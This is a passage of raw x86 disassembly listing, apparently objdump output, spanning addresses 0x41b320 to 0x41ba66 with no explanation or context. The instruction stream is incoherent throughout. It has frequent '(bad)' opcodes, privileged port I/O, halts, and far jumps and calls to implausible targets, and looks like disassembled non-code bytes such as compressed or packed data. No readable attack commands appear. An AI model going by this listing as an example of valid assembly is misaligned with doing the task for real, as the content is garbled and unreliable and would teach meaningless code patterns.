  41b320:	sbb    DWORD PTR [eax-0x7],edx
  41b323:	cdq    
  41b324:	cmp    DWORD PTR [ecx-0x2d6d7fd0],edx
  41b32a:	scas   eax,DWORD PTR es:[edi]
  41b32b:	aaa    
  41b32c:	shr    ebx,0x28
  41b32f:	test   eax,0xc32cb8f7
  41b334:	mov    cl,0x2b
  41b336:	fdivr  QWORD PTR [edx-0x7a]
  41b339:	mov    ecx,0xd7ff0ac3
  41b33e:	jg     0x41b33d
  41b340:	jmp    0xe73746b0
  41b345:	lods   al,BYTE PTR ds:[esi]
  41b346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b347:	xor    eax,0xc49111fb
  41b34c:	les    esi,FWORD PTR [ecx+ebx*4-0x3]
  41b350:	add    ch,BYTE PTR [edx+0x60]
  41b353:	cli    
  41b354:	dec    esi
  41b355:	jmp    0x41b38e
  41b357:	hlt    
  41b358:	adc    al,0x1f
  41b35a:	pop    ds
  41b35b:	idiv   DWORD PTR fs:[ecx]
  41b35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b35f:	xchg   esp,eax
  41b360:	xchg   ecx,eax
  41b361:	sub    eax,0x7e13cf00
  41b366:	mov    ebx,0xe26f12f3
  41b36b:	test   eax,0xf9b68e75
  41b370:	adc    edx,DWORD PTR [ebx*4-0x341d4fa2]
  41b377:	adc    eax,0xb21eede8
  41b37c:	jl     0x41b387
  41b37e:	jmp    0xcaba:0x68b86b4c
  41b385:	mov    eax,0xea1ad5b2
  41b38a:	or     al,0x23
  41b38c:	mov    ss,WORD PTR [ecx]
  41b38e:	mov    WORD PTR [ecx-0x35],es
  41b391:	sahf   
  41b392:	cmp    esi,esp
  41b394:	dec    eax
  41b395:	pop    ebp
  41b396:	repnz adc DWORD PTR [edi-0x78],0x45
  41b39b:	sar    bh,1
  41b39d:	in     al,0xf1
  41b39f:	pop    ecx
  41b3a0:	mov    fs,WORD PTR [ebp+0x419b4beb]
  41b3a6:	daa    
  41b3a7:	aaa    
  41b3a8:	cmp    ch,BYTE PTR [eax]
  41b3aa:	jmp    0x79e81561
  41b3af:	pop    edx
  41b3b0:	add    BYTE PTR [edx],dl
  41b3b2:	repz shr bh,0xbc
  41b3b6:	jno    0x41b424
  41b3b8:	ins    BYTE PTR es:[edi],dx
  41b3b9:	push   ds
  41b3ba:	es aas 
  41b3bc:	test   eax,0x13b4a29a
  41b3c1:	mov    esi,0xd0435fee
  41b3c6:	pop    ecx
  41b3c7:	mov    cl,cl
  41b3c9:	push   0xffffffd2
  41b3cb:	adc    bl,bl
  41b3cd:	sbb    DWORD PTR [ecx],esp
  41b3cf:	and    edi,DWORD PTR [edi+0x13c363e4]
  41b3d5:	cmp    eax,0xd8d8d49d
  41b3da:	dec    ebx
  41b3db:	jb     0x41b41f
  41b3dd:	fist   WORD PTR [ebp+0x2b]
  41b3e0:	stos   BYTE PTR es:[edi],al
  41b3e1:	pusha  
  41b3e2:	or     al,0x5e
  41b3e4:	push   ebx
  41b3e5:	aaa    
  41b3e6:	jle    0x41b3ab
  41b3e8:	cmp    BYTE PTR [edi+0x11f088de],ah
  41b3ee:	(bad)  
  41b3ef:	or     DWORD PTR [edx+0x51dd397f],esp
  41b3f5:	xchg   WORD PTR [ecx],cx
  41b3f8:	into   
  41b3f9:	xchg   DWORD PTR [ecx],ebx
  41b3fb:	enter  0xa0f5,0x80
  41b3ff:	jecxz  0x41b3ff
  41b401:	in     eax,0x20
  41b403:	push   cs
  41b404:	lods   eax,DWORD PTR ds:[esi]
  41b405:	adc    DWORD PTR [ebp-0x6e32111c],esi
  41b40b:	jle    0x41b3d1
  41b40d:	add    DWORD PTR [ecx+0x36],edi
  41b410:	imul   ebp,DWORD PTR [esi-0x597c38f7],0xa2f6f7e6
  41b41a:	or     eax,0x8befd439
  41b41f:	loope  0x41b3eb
  41b421:	xor    DWORD PTR [edi-0x531cd8b1],eax
  41b427:	pop    ebp
  41b428:	jle    0x41b4a1
  41b42a:	add    dl,bl
  41b42c:	push   edi
  41b42d:	fmul   DWORD PTR [ecx]
  41b42f:	mov    ds:0xe1a23466,eax
  41b434:	inc    ebx
  41b435:	mov    eax,ds:0x5b2baaaf
  41b43a:	cmovne esp,DWORD PTR [edi]
  41b43d:	mov    bh,0xdb
  41b43f:	xchg   edi,eax
  41b440:	push   ebx
  41b441:	idiv   DWORD PTR [eax]
  41b443:	dec    eax
  41b444:	popa   
  41b445:	hlt    
  41b446:	push   eax
  41b447:	adc    eax,0x733d9530
  41b44c:	sbb    DWORD PTR [edi-0x591d5da4],0xffffffa7
  41b453:	(bad)  
  41b455:	pop    ebx
  41b456:	scas   al,BYTE PTR es:[edi]
  41b457:	rol    DWORD PTR [esp+eax*1+0x45],1
  41b45b:	ds pop ds
  41b45d:	and    BYTE PTR [ebx],dl
  41b45f:	daa    
  41b460:	add    BYTE PTR [esp+eax*8],0xe8
  41b464:	aam    0x4b
  41b466:	lods   eax,DWORD PTR ds:[esi]
  41b468:	mov    ds:0xf8b48161,al
  41b46d:	pop    ebp
  41b46e:	push   ebp
  41b46f:	add    eax,0x72d918d9
  41b474:	xchg   ebp,eax
  41b475:	xchg   esi,eax
  41b476:	popa   
  41b477:	(bad)  
  41b478:	or     al,dh
  41b47a:	push   esp
  41b47b:	cli    
  41b47c:	mov    bl,0x63
  41b47e:	test   al,0xe0
  41b480:	cmp    esi,ebx
  41b482:	(bad)  
  41b483:	mov    eax,es:0x62e5c50a
  41b489:	mov    al,0x43
  41b48b:	lds    esi,FWORD PTR [ebx]
  41b48d:	sub    edx,esi
  41b48f:	or     eax,0x1a1f12ca
  41b494:	imul   edi,ebx,0xb
  41b497:	sub    eax,0x8217c73d
  41b49c:	or     eax,0xe00668a3
  41b4a1:	dec    edx
  41b4a2:	jbe    0x41b465
  41b4a4:	jmp    0x54579f2
  41b4a9:	mov    ah,0x92
  41b4ab:	mov    BYTE PTR [edx-0x6c745670],bh
  41b4b1:	adc    DWORD PTR [eax],edx
  41b4b3:	outs   dx,BYTE PTR ds:[esi]
  41b4b4:	sub    eax,0xc08312e4
  41b4b9:	lods   eax,DWORD PTR ds:[esi]
  41b4ba:	aaa    
  41b4bb:	mov    ds:0xb1f95b95,eax
  41b4c0:	dec    eax
  41b4c1:	cmc    
  41b4c2:	call   0x5ecc:0x3dffdc8d
  41b4c9:	outs   dx,DWORD PTR ds:[esi]
  41b4ca:	inc    BYTE PTR [ebx-0x7a891df7]
  41b4d0:	test   al,0xfa
  41b4d2:	lea    ecx,[ebp-0x1591fd61]
  41b4d8:	mov    al,BYTE PTR [edx+0x352836c0]
  41b4de:	xor    eax,0xd5ff7b79
  41b4e3:	dec    edx
  41b4e4:	inc    edx
  41b4e5:	pop    edx
  41b4e6:	sub    edi,DWORD PTR [esi+0x3d]
  41b4e9:	stc    
  41b4ea:	or     DWORD PTR [edx],ecx
  41b4ec:	inc    ecx
  41b4ed:	push   eax
  41b4ee:	inc    eax
  41b4ef:	adc    DWORD PTR [edx],0x69
  41b4f2:	or     DWORD PTR [ecx],edi
  41b4f4:	add    DWORD PTR [edx+0x53],ebx
  41b4f7:	or     DWORD PTR [eax-0x4b],ebp
  41b4fa:	and    BYTE PTR [esi+0x45],ch
  41b4fd:	add    DWORD PTR [esi+0x93d9325],ebp
  41b503:	in     eax,dx
  41b504:	stos   BYTE PTR es:[edi],al
  41b505:	imul   edi,DWORD PTR [ecx+eiz*8],0x5c
  41b509:	(bad)  
  41b50b:	add    eax,0xd4399614
  41b510:	loope  0x41b574
  41b512:	pusha  
  41b513:	leave  
  41b514:	je     0x41b4c7
  41b516:	dec    esp
  41b517:	aas    
  41b518:	push   ebp
  41b519:	and    ch,bh
  41b51b:	inc    esp
  41b51c:	adc    BYTE PTR [eax],bl
  41b51e:	pop    ebx
  41b51f:	mov    ch,0xc8
  41b521:	pop    ds
  41b522:	pop    edx
  41b523:	(bad)  
  41b524:	jns    0x41b59d
  41b526:	xchg   ebx,eax
  41b527:	dec    edi
  41b528:	mov    al,ds:0xc63b58b6
  41b52d:	or     al,BYTE PTR [ebp-0x3c]
  41b530:	xlat   BYTE PTR ds:[ebx]
  41b531:	and    esi,DWORD PTR [edx+0x22af2a7f]
  41b537:	test   eax,0xb415bc06
  41b53c:	adc    al,0x78
  41b53e:	and    al,0xb5
  41b540:	sub    DWORD PTR [eax+0x5b],0xffffffde
  41b544:	sbb    al,0xd9
  41b546:	cli    
  41b547:	adc    al,0x6c
  41b549:	cmc    
  41b54a:	lahf   
  41b54b:	cs scas al,BYTE PTR es:[edi]
  41b54d:	fsubr  QWORD PTR fs:[edi+0x586c2012]
  41b554:	cwde   
  41b555:	cmp    DWORD PTR [ebx],esi
  41b557:	std    
  41b558:	aam    0xb5
  41b55a:	bsf    ebp,DWORD PTR [ebx-0x1eb44568]
  41b561:	stc    
  41b562:	sar    BYTE PTR [ecx+0x5b842910],0x8c
  41b569:	nop
  41b56a:	shl    bh,1
  41b56c:	fsubr  st,st(3)
  41b56e:	cwde   
  41b56f:	inc    ebp
  41b570:	je     0x41b512
  41b572:	out    0x7d,eax
  41b574:	mov    ds:0x17a9333d,eax
  41b579:	push   esp
  41b57a:	inc    ebp
  41b57b:	stos   BYTE PTR es:[edi],al
  41b57c:	jae    0x41b507
  41b57e:	mov    dh,0x18
  41b580:	les    eax,FWORD PTR [esi+0x54]
  41b583:	mov    eax,ds:0x951ac1d9
  41b588:	in     eax,dx
  41b589:	or     al,cl
  41b58b:	sub    DWORD PTR [ecx+0x35],ecx
  41b58e:	xlat   BYTE PTR ds:[ebx]
  41b58f:	lea    ebx,[ebp+0x2a]
  41b592:	lds    esp,FWORD PTR [edi-0x45]
  41b595:	and    al,0x45
  41b597:	gs pop es
  41b599:	jl     0x41b5a4
  41b59b:	sbb    al,0x5a
  41b59d:	push   ds
  41b59e:	dec    esi
  41b59f:	es mov edx,0x8c12c4db
  41b5a5:	mov    esi,0x8efd0f28
  41b5aa:	adc    al,0xe9
  41b5ac:	push   cs
  41b5ad:	pop    edx
  41b5ae:	xchg   edx,eax
  41b5af:	stos   BYTE PTR es:[edi],al
  41b5b0:	pop    edi
  41b5b1:	or     edi,DWORD PTR [edx-0x620d81b5]
  41b5b7:	xor    al,0x7d
  41b5b9:	lods   al,BYTE PTR ds:[esi]
  41b5ba:	xchg   BYTE PTR [edi+ecx*2+0x37cbfc9b],bh
  41b5c1:	or     dl,al
  41b5c3:	mov    al,ch
  41b5c5:	add    al,0x72
  41b5c7:	xchg   ecx,eax
  41b5c8:	pop    eax
  41b5c9:	outs   dx,DWORD PTR ds:[esi]
  41b5ca:	into   
  41b5cb:	xor    dl,bh
  41b5cd:	lods   eax,DWORD PTR ds:[esi]
  41b5ce:	mov    al,ds:0x96b303eb
  41b5d3:	mov    esi,0xdcdfa319
  41b5d8:	xor    BYTE PTR [ebp-0x16],ch
  41b5db:	inc    ebp
  41b5dc:	sbb    ch,BYTE PTR [edi+0x38]
  41b5df:	inc    ebp
  41b5e0:	call   DWORD PTR [esi+0x23]
  41b5e3:	push   ss
  41b5e4:	(bad)  
  41b5e5:	out    dx,eax
  41b5e6:	repz or DWORD PTR [ebx+edx*8+0x41],edx
  41b5eb:	push   cs
  41b5ec:	pop    es
  41b5ed:	outs   dx,BYTE PTR ds:[esi]
  41b5ee:	pop    ebp
  41b5ef:	mov    ah,al
  41b5f1:	in     eax,dx
  41b5f2:	add    eax,0x22d044eb
  41b5f7:	inc    esp
  41b5f8:	xor    DWORD PTR [edx+0x72],0x13
  41b5fc:	adc    ecx,edx
  41b5fe:	sbb    esi,ebx
  41b600:	mov    cl,0x1c
  41b602:	out    0xad,eax
  41b604:	push   eax
  41b605:	das    
  41b606:	hlt    
  41b607:	and    dl,BYTE PTR [esi+0x3faa1721]
  41b60d:	mov    ecx,0xa025858
  41b612:	gs je  0x41b5d8
  41b615:	mov    DWORD PTR [edx-0x22],ebp
  41b618:	sub    edi,DWORD PTR [ecx-0x7e95724b]
  41b61e:	cld    
  41b61f:	push   edx
  41b620:	scas   al,BYTE PTR es:[edi]
  41b621:	jne    0x41b65a
  41b623:	cmc    
  41b624:	xchg   esp,eax
  41b625:	jo     0x41b5cb
  41b627:	sub    dh,BYTE PTR [ebx+eax*1]
  41b62a:	(bad)  
  41b62b:	outs   dx,DWORD PTR ds:[esi]
  41b62c:	dec    edx
  41b62d:	int    0xf9
  41b62f:	pop    esi
  41b630:	jg     0x41b660
  41b632:	std    
  41b633:	clc    
  41b634:	jb     0x41b65a
  41b636:	sub    al,0x99
  41b638:	mov    dl,BYTE PTR [ecx+ebp*8+0x72]
  41b63c:	inc    edi
  41b63d:	push   es
  41b63e:	mov    bl,0x9d
  41b640:	jecxz  0x41b685
  41b642:	inc    esp
  41b643:	inc    BYTE PTR [edx+0x4f]
  41b646:	jp     0x41b5d2
  41b648:	bound  ecx,QWORD PTR [esi-0x6d]
  41b64b:	cmp    dl,dh
  41b64d:	add    DWORD PTR es:[ebx],0xffffffc2
  41b651:	mov    dl,0x76
  41b653:	aaa    
  41b654:	jmp    0x1ee7d4c8
  41b659:	xor    al,bh
  41b65b:	sbb    al,0x50
  41b65d:	pop    ebx
  41b65e:	adc    bl,al
  41b660:	ret    0x6349
  41b663:	(bad)  [esi]
  41b665:	push   esp
  41b666:	dec    ecx
  41b667:	bound  eax,QWORD PTR [edi+eiz*2-0x4a69104d]
  41b66e:	xor    cl,bh
  41b670:	stc    
  41b671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b672:	test   al,0x19
  41b674:	daa    
  41b675:	mov    esp,0x7475a54
  41b67a:	shr    DWORD PTR [eax],0x83
  41b67d:	push   0x3c5c5e47
  41b682:	call   0xc6e58aa0
  41b687:	adc    eax,0x7e7cac1
  41b68c:	pop    edx
  41b68d:	aas    
  41b68e:	and    eax,0xf4d88daf
  41b693:	gs mov edx,0xce247aec
  41b699:	out    dx,al
  41b69a:	outs   dx,BYTE PTR ds:[esi]
  41b69b:	stos   BYTE PTR es:[edi],al
  41b69c:	inc    esp
  41b69d:	mov    ecx,0x69bfdc2a
  41b6a2:	xlat   BYTE PTR ds:[ebx]
  41b6a3:	ins    DWORD PTR es:[edi],dx
  41b6a4:	and    DWORD PTR [ebx-0x80],0x17
  41b6a8:	rol    bh,cl
  41b6aa:	test   al,0xce
  41b6ac:	add    BYTE PTR ss:[eax+0x26],dl
  41b6b0:	push   ds
  41b6b1:	sbb    eax,0xac6b2f25
  41b6b6:	mov    ch,0xf1
  41b6b8:	cmp    dh,BYTE PTR [eax-0x1bb04ff]
  41b6be:	clc    
  41b6bf:	fwait
  41b6c0:	inc    ecx
  41b6c1:	outs   dx,DWORD PTR ds:[esi]
  41b6c2:	pop    eax
  41b6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6c4:	pop    DWORD PTR [edi+0x76]
  41b6c7:	dec    ebx
  41b6c8:	and    eax,0x8e984a4b
  41b6cd:	sub    ecx,DWORD PTR [eax]
  41b6cf:	int3   
  41b6d0:	sbb    al,0xee
  41b6d2:	shl    DWORD PTR [ecx+0x4f],cl
  41b6d5:	stos   DWORD PTR es:[edi],eax
  41b6d6:	or     DWORD PTR ss:[esi],esi
  41b6d9:	pop    esi
  41b6da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6db:	jae    0x41b665
  41b6dd:	mov    ch,0xd2
  41b6df:	add    DWORD PTR [eax+0x6f],ebp
  41b6e2:	mov    gs,esi
  41b6e4:	mov    dh,0x5a
  41b6e6:	mov    ch,0x24
  41b6e8:	aaa    
  41b6e9:	cwde   
  41b6ea:	push   ds
  41b6eb:	cmp    BYTE PTR [ebp-0x1e],al
  41b6ee:	test   BYTE PTR ds:0x80246f96,ch
  41b6f4:	cmp    cl,BYTE PTR [ebx+0x5ccee480]
  41b6fa:	inc    DWORD PTR ds:0x64f00399
  41b700:	adc    edi,esp
  41b702:	pop    DWORD PTR [ecx]
  41b704:	lods   al,BYTE PTR ds:[esi]
  41b705:	inc    ebp
  41b706:	scas   al,BYTE PTR es:[edi]
  41b707:	das    
  41b708:	pushf  
  41b709:	data16 jbe 0x41b719
  41b70c:	out    0xec,al
  41b70e:	pop    edi
  41b70f:	mov    al,0x25
  41b711:	push   esp
  41b712:	adc    eax,0xfa642874
  41b717:	pop    esp
  41b718:	adc    dh,BYTE PTR [esi+0xd12fafd]
  41b71e:	jnp    0x41b6f4
  41b720:	xlat   BYTE PTR ds:[ebx]
  41b721:	and    bh,ah
  41b723:	mov    dh,0xd1
  41b725:	push   0x57
  41b727:	scas   eax,DWORD PTR es:[edi]
  41b728:	mov    ebx,gs
  41b72a:	jnp    0x41b711
  41b72c:	mov    al,ds:0x105ddbb
  41b731:	adc    BYTE PTR [edi+0x60],dh
  41b734:	fcomp  QWORD PTR [edx+0x54f42257]
  41b73a:	mov    fs,WORD PTR [ebx+edx*1-0x12]
  41b73e:	add    BYTE PTR [esi+0x2836e9fe],dl
  41b744:	cld    
  41b745:	inc    ebp
  41b746:	xchg   ebx,eax
  41b747:	lahf   
  41b748:	scas   eax,DWORD PTR es:[edi]
  41b749:	mov    dl,0xcc
  41b74b:	pop    ss
  41b74c:	pusha  
  41b74d:	or     eax,0x54fc282e
  41b752:	xchg   esp,eax
  41b753:	in     eax,0x3d
  41b755:	push   esi
  41b756:	in     eax,dx
  41b757:	fwait
  41b758:	and    DWORD PTR [ebx-0x1a],0xffffffb3
  41b75c:	ds cmc 
  41b75e:	mov    ebx,0xfee0a64d
  41b763:	xchg   DWORD PTR [ebx],esp
  41b765:	jmp    0xaadc:0xa6798df0
  41b76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b76d:	jecxz  0x41b786
  41b76f:	xchg   edx,eax
  41b770:	mov    ds:0x65dcdcd1,al
  41b775:	dec    ebp
  41b776:	das    
  41b777:	aam    0xfa
  41b779:	fistp  QWORD PTR [ebx+eax*2+0x18]
  41b77d:	scas   al,BYTE PTR es:[edi]
  41b77e:	jp     0x41b780
  41b780:	mov    dh,0x62
  41b782:	dec    esp
  41b783:	inc    ebp
  41b784:	dec    ecx
  41b785:	cli    
  41b786:	ss les esi,FWORD PTR es:[edx+eiz*8+0x59]
  41b78c:	aam    0x85
  41b78e:	xor    ecx,DWORD PTR [edx]
  41b790:	and    DWORD PTR [esi],ecx
  41b792:	and    ch,BYTE PTR [ebx+0x3d7eb4e8]
  41b798:	mov    dl,0xd5
  41b79a:	cwde   
  41b79b:	xchg   ecx,eax
  41b79c:	js     0x41b7c3
  41b79e:	xchg   DWORD PTR [ebp-0x554bba98],esi
  41b7a4:	les    ecx,FWORD PTR [esi]
  41b7a6:	or     dl,0xef
  41b7a9:	or     DWORD PTR [edx],ebp
  41b7ab:	mov    esp,0x86ffb3fb
  41b7b0:	sub    DWORD PTR [eax+0x4404a4d1],ecx
  41b7b6:	fidivr WORD PTR [eax]
  41b7b8:	fsubr  QWORD PTR [ebp-0x2]
  41b7bb:	sbb    BYTE PTR [esi+0x7890c46a],bh
  41b7c1:	cwde   
  41b7c2:	jmp    0x41b7ec
  41b7c4:	mov    edx,0x93fc41ec
  41b7c9:	push   ss
  41b7ca:	fcomp  DWORD PTR [edi+0x7bdd2802]
  41b7d0:	dec    esp
  41b7d1:	dec    edx
  41b7d2:	inc    edx
  41b7d3:	pop    edx
  41b7d4:	adc    DWORD PTR [eax+0x4efa4a52],esi
  41b7da:	out    dx,eax
  41b7db:	in     eax,dx
  41b7dc:	rcl    DWORD PTR [edx-0x7b4dbb78],0xaa
  41b7e3:	stos   DWORD PTR es:[edi],eax
  41b7e4:	test   al,0xf4
  41b7e6:	pop    ds
  41b7e7:	dec    ebp
  41b7e8:	lods   al,BYTE PTR ds:[esi]
  41b7e9:	or     edi,DWORD PTR [edx+esi*8]
  41b7ec:	retf   
  41b7ed:	pop    ss
  41b7ee:	adc    al,0x35
  41b7f0:	retf   
  41b7f1:	mov    esp,0xc9a484b3
  41b7f6:	mov    ecx,0x9c394611
  41b7fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7fc:	mov    WORD PTR [ecx+0x6f],fs
  41b7ff:	loop   0x41b7b5
  41b801:	mov    dh,BYTE PTR [ebp+0x7e]
  41b804:	dec    eax
  41b805:	jle    0x41b7ac
  41b807:	popa   
  41b808:	push   ebx
  41b809:	or     DWORD PTR [esi-0x6ca439a6],ecx
  41b80f:	mov    ecx,0xff17897f
  41b814:	std    
  41b815:	cwde   
  41b816:	jle    0x41b7d1
  41b818:	push   ds
  41b819:	loope  0x41b81a
  41b81b:	add    BYTE PTR [eax+0x18c7fa2a],ch
  41b821:	mov    al,0x78
  41b823:	mov    WORD PTR [edi+0x37753d71],?
  41b829:	sub    eax,0xf5d3b71
  41b82e:	out    0xca,al
  41b830:	mov    ebx,0x896d520d
  41b835:	xor    al,cl
  41b837:	jnp    0x41b7e0
  41b839:	inc    edx
  41b83a:	es mov ch,0xcb
  41b83d:	sub    BYTE PTR [ebp+0x36683ca1],ah
  41b843:	(bad)  
  41b844:	pop    esp
  41b845:	stos   BYTE PTR es:[edi],al
  41b846:	add    edi,DWORD PTR [ebp+esi*8-0x30]
  41b84a:	mov    ebx,0x95b44b0
  41b84f:	mov    ch,0x8a
  41b851:	rcl    DWORD PTR [eax+ecx*8-0x7c757ec2],0x7e
  41b859:	ror    DWORD PTR [ebx+0x6],cl
  41b85c:	pop    ebx
  41b85d:	or     al,0xa5
  41b85f:	pusha  
  41b860:	push   eax
  41b861:	out    0x73,eax
  41b863:	shl    BYTE PTR [edx+0x22ee671],1
  41b869:	and    cl,ah
  41b86b:	ror    ebx,1
  41b86d:	int3   
  41b86e:	jno    0x41b898
  41b870:	jae    0x41b849
  41b872:	(bad)  
  41b873:	in     eax,dx
  41b874:	fimul  DWORD PTR ds:0x19d77c41
  41b87a:	adc    ecx,DWORD PTR [eax]
  41b87c:	dec    edi
  41b87d:	inc    esi
  41b87e:	jno    0x41b8ee
  41b880:	push   ds
  41b881:	sti    
  41b882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b883:	enter  0x507c,0xa1
  41b887:	dec    eax
  41b888:	xchg   ecx,eax
  41b889:	inc    edx
  41b88a:	add    DWORD PTR [esi+0x64],edx
  41b88d:	sahf   
  41b88e:	cmp    eax,ebx
  41b890:	out    dx,eax
  41b891:	je     0x41b8ea
  41b893:	mov    dl,0x26
  41b895:	push   ebp
  41b896:	pop    ebx
  41b897:	xchg   ebx,eax
  41b898:	xor    al,0x2
  41b89a:	xchg   edx,eax
  41b89b:	out    dx,eax
  41b89c:	in     eax,0xcb
  41b89e:	mov    ds:0x5445fa5a,al
  41b8a3:	sbb    BYTE PTR ds:0x5295c6dc,dl
  41b8a9:	test   eax,0xc87de0f
  41b8ae:	mov    ch,0x24
  41b8b0:	cmp    eax,0x322de56e
  41b8b5:	scas   eax,DWORD PTR es:[edi]
  41b8b6:	les    edx,FWORD PTR [edi+0x75]
  41b8b9:	ins    BYTE PTR es:[edi],dx
  41b8ba:	in     eax,dx
  41b8bb:	xchg   DWORD PTR [ecx+eiz*2],edi
  41b8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8bf:	test   BYTE PTR [ebx],dl
  41b8c1:	loope  0x41b859
  41b8c3:	repnz adc BYTE PTR [edi],0xa9
  41b8c7:	cs mov ebp,0xde238d3
  41b8cd:	sahf   
  41b8ce:	mov    al,ds:0xd3939290
  41b8d3:	jmp    0xe6c5:0x7873b2ed
  41b8da:	sub    BYTE PTR [edi-0x48e4a74d],cl
  41b8e0:	cmp    BYTE PTR [eax+0x6d],al
  41b8e3:	sahf   
  41b8e4:	lea    eax,[esi-0x106c93e9]
  41b8ea:	test   DWORD PTR [ecx],edx
  41b8ec:	retf   0x4177
  41b8ef:	pushf  
  41b8f0:	das    
  41b8f1:	dec    edx
  41b8f2:	dec    edx
  41b8f3:	xchg   esi,eax
  41b8f4:	mov    esp,0xb08d1550
  41b8f9:	rcr    BYTE PTR [ecx+0x126f9451],0x8c
  41b900:	mov    cl,0x9b
  41b902:	daa    
  41b903:	dec    ebx
  41b904:	addr16 xchg cl,bh
  41b907:	dec    ebp
  41b908:	push   ss
  41b909:	je     0x41b8a3
  41b90b:	push   0x83aaddc
  41b910:	xor    al,0x56
  41b912:	xor    eax,0xbd86333c
  41b917:	push   0xc8e8e57f
  41b91c:	jp     0x41b91c
  41b91e:	(bad)  
  41b91f:	pop    eax
  41b920:	rol    BYTE PTR [esi],cl
  41b922:	stos   DWORD PTR es:[edi],eax
  41b923:	jmp    0x9ced:0x7582126
  41b92a:	imul   ebp,DWORD PTR cs:[edx+0x4f],0x9e5f3847
  41b932:	dec    ch
  41b934:	push   ebx
  41b935:	clc    
  41b936:	xchg   BYTE PTR [edi*8-0x3d9b0450],ch
  41b93d:	mov    eax,0x9219654b
  41b942:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41b944:	ror    esp,0x2f
  41b947:	push   0x6163b573
  41b94c:	jbe    0x41b8f7
  41b94e:	ret    
  41b94f:	ret    
  41b950:	adc    eax,0x164b6b7
  41b955:	repz or bh,0x31
  41b959:	dec    ecx
  41b95a:	sahf   
  41b95b:	in     al,0x72
  41b95d:	pop    ecx
  41b95e:	pushf  
  41b95f:	repnz and ecx,DWORD PTR [esi+0x7ca441f7]
  41b966:	sbb    ecx,DWORD PTR [esi]
  41b968:	(bad)  
  41b96a:	aaa    
  41b96b:	xchg   DWORD PTR [eax-0x2e],edi
  41b96e:	cmp    BYTE PTR [eax-0x2ff71781],cl
  41b974:	shl    BYTE PTR [edi-0x4],cl
  41b977:	and    eax,0xf4f65044
  41b97c:	lahf   
  41b97d:	(bad)  
  41b97e:	pop    ebp
  41b97f:	xchg   ebp,eax
  41b980:	call   0xac4e14d9
  41b985:	xchg   edx,eax
  41b986:	(bad)  
  41b987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b988:	fiadd  DWORD PTR [ebx+0x1f]
  41b98b:	test   dl,dh
  41b98d:	sti    
  41b98e:	mov    esp,0x816ffd2d
  41b993:	cmp    eax,0x5897ecdf
  41b998:	and    BYTE PTR [edi-0x53],dh
  41b99b:	rol    BYTE PTR [ebx],1
  41b99d:	mov    al,ds:0x7dd03c86
  41b9a2:	mov    dl,0x32
  41b9a4:	sbb    bh,ah
  41b9a6:	xor    ah,BYTE PTR [edx-0x137a194d]
  41b9ac:	adc    BYTE PTR [ecx-0x57],cl
  41b9af:	xor    eax,0x50b3c703
  41b9b4:	cmp    eax,0xa8bb16a6
  41b9b9:	repnz adc ecx,DWORD PTR [eax]
  41b9bc:	or     bl,BYTE PTR [edi]
  41b9be:	sub    dh,cl
  41b9c0:	popa   
  41b9c1:	out    0x4c,al
  41b9c3:	out    dx,al
  41b9c4:	cld    
  41b9c5:	push   ecx
  41b9c6:	sbb    BYTE PTR [ebp-0x73],0x19
  41b9ca:	leave  
  41b9cb:	pusha  
  41b9cc:	mov    cl,0xef
  41b9ce:	lods   eax,DWORD PTR ds:[esi]
  41b9cf:	ja     0x41b978
  41b9d1:	xor    esi,DWORD PTR [edx+ebx*4]
  41b9d4:	pop    ds
  41b9d5:	repz arpl WORD PTR [ebp+0xbe4bef9],bp
  41b9dc:	xchg   edi,eax
  41b9dd:	loopne 0x41b9e9
  41b9df:	dec    ebx
  41b9e0:	mov    ds:0x4311a46f,eax
  41b9e5:	addr16 sbb al,0xb1
  41b9e8:	xchg   esp,eax
  41b9e9:	xchg   ebp,eax
  41b9ea:	mov    ebx,0xbdf54c62
  41b9ef:	icebp  
  41b9f0:	inc    edi
  41b9f1:	ficomp DWORD PTR [ebp-0x74]
  41b9f4:	lds    esp,FWORD PTR [ebx]
  41b9f6:	sahf   
  41b9f7:	mov    al,0x54
  41b9f9:	nop
  41b9fa:	pop    ss
  41b9fb:	lods   eax,DWORD PTR ds:[esi]
  41b9fc:	sub    edx,DWORD PTR [ebp+0x68457c44]
  41ba02:	call   0xcaa02729
  41ba07:	stc    
  41ba08:	(bad)  [eax-0x66d38239]
  41ba0e:	xor    cl,BYTE PTR [ebp-0x32]
  41ba11:	mov    al,ds:0xfced51f7
  41ba16:	push   ecx
  41ba17:	ss aas 
  41ba19:	lock xor edx,ebx
  41ba1c:	shl    BYTE PTR [ebp+0x25e0539c],cl
  41ba22:	sub    BYTE PTR [edi+0x2d],bl
  41ba25:	(bad)  
  41ba26:	push   eax
  41ba27:	cli    
  41ba28:	or     ch,BYTE PTR [edx]
  41ba2a:	xchg   ecx,eax
  41ba2b:	add    DWORD PTR [esp+esi*8-0xedcdcac],edx
  41ba32:	std    
  41ba33:	stc    
  41ba34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba35:	cmp    DWORD PTR [edi-0x66967560],esi
  41ba3b:	xchg   edi,eax
  41ba3c:	jns    0x41ba92
  41ba3e:	ins    BYTE PTR es:[edi],dx
  41ba3f:	jecxz  0x41babf
  41ba41:	lods   eax,DWORD PTR ds:[esi]
  41ba42:	push   0xffffff93
  41ba44:	pop    esi
  41ba45:	addr16 dec eax
  41ba47:	jecxz  0x41baae
  41ba49:	or     edx,edi
  41ba4b:	dec    edx
  41ba4c:	sbb    ch,al
  41ba4e:	jbe    0x41ba2e
  41ba50:	and    ebp,DWORD PTR [edx]
  41ba52:	fst    DWORD PTR fs:[edi]
  41ba55:	dec    eax
  41ba57:	xor    BYTE PTR [ebp+0x76],dh
  41ba5a:	xchg   edi,eax
  41ba5b:	repz mov esp,0xfae6249
  41ba61:	mov    al,0xd8
  41ba63:	adc    cl,bh
  41ba65:	scas   al,BYTE PTR es:[edi]
  41ba66:	mov    ecx,0x87337eab
